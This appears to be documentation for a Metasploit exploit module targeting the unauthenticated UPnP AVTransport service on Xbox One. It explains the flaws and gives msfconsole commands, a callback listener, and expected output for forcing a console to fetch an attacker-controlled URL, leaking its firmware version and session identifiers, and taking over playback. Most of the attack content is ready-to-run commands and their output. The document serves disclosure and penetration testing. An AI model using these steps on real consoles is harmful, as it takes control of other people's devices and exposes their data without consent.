## Vulnerability

The UPnP AVTransport service (`udhisapi.dll`) on Microsoft Xbox One accepts media
control SOAP actions from any host on the local network without authentication,
pairing, or authorization checks (CWE-306).

By issuing `SetAVTransportURI` followed by `Play`, an adjacent attacker forces the
console's `NSPlayer/WMFSDK` stack to perform an outbound HTTP GET to an
attacker-controlled URL (CWE-918 SSRF). The callback leaks device firmware version,
DLNA capabilities, and session identifiers (CWE-200). The active user session is
also interrupted as Films & TV is foregrounded (App Escape).

Tested firmware: `NSPlayer/12.00.26100.7813 WMFSDK/12.00.26100.7813`.

## Setup

The attacker and the target Xbox One must be on the same Layer-2/Layer-3 network
segment, or the attacker must be able to route TCP/2869 to the target.

### Start the SSRF callback listener

```
python3 server.py
```

Expected output when the Xbox connects:

```
==================================================
Method:  GET
Path:    /test.mp4
From:    192.168.1.29:NNNNN
Headers:
  User-Agent: NSPlayer/12.00.26100.7813 WMFSDK/12.00.26100.7813
  GetContentFeatures.dlna.org: 1
  transferMode.dlna.org: Streaming
  FriendlyName.DLNA.ORG: XBOX
  Host: 192.168.1.62:8080
```

## Verification

Use the `check` command before running the exploit:

```
msf6 exploit(windows/upnp/xbox_one_media_takeover) > check
[+] 192.168.1.29:2869 - The target is vulnerable. UPnP services are exposed and reachable.
```

## Options

| Option | Default | Description |
|---|---|---|
| `RHOSTS` | — | Target Xbox One IP address |
| `RPORT` | 2869 | UPnP host port |
| `UUID` | (blank) | Device UUID — auto-discovered via SSDP if blank |
| `SSDP_TIMEOUT` | 3 | Seconds to wait for SSDP multicast response |
| `MEDIA_URL` | — | Attacker-controlled URL the Xbox will fetch |
| `VOLUME` | 100 | Volume to set via RenderingControl before playback |

## Scenarios

### Scenario 1 — SSRF callback with firmware disclosure

Configure a listener on the attacker machine, then run:

```
msf6 > use exploit/windows/upnp/xbox_one_media_takeover
msf6 exploit(windows/upnp/xbox_one_media_takeover) > set RHOSTS 192.168.1.29
msf6 exploit(windows/upnp/xbox_one_media_takeover) > set MEDIA_URL http://192.168.1.62:8080/test.mp4
msf6 exploit(windows/upnp/xbox_one_media_takeover) > run
```

Expected console output:

```
[*] Trying SSDP auto-discovery (UDP multicast, timeout: 3s)...
[+] SSDP: found UUID f59636db-9bb8-4a68-a123-c59ab695077d at 192.168.1.29
[+] Target UUID: f59636db-9bb8-4a68-a123-c59ab695077d
[*] Setting volume to 100%...
[*] Injecting Media URL: http://192.168.1.62:8080/test.mp4
[+] Media URI accepted.
[*] Triggering Play command (App Escape)...
[+] Exploit executed successfully! The Xbox should now be playing the media.
```

### Scenario 2 — Manual UUID (SSDP unavailable)

If the attacker cannot receive the SSDP multicast response (e.g., due to routing
restrictions), supply the UUID manually:

```
msf6 exploit(windows/upnp/xbox_one_media_takeover) > set UUID f59636db-9bb8-4a68-a123-c59ab695077d
msf6 exploit(windows/upnp/xbox_one_media_takeover) > run
```

The UUID can be obtained by fetching the descriptor directly:

```
curl -s http://192.168.1.29:2869/upnphost/udhisapi.dll?description | grep UDN
```
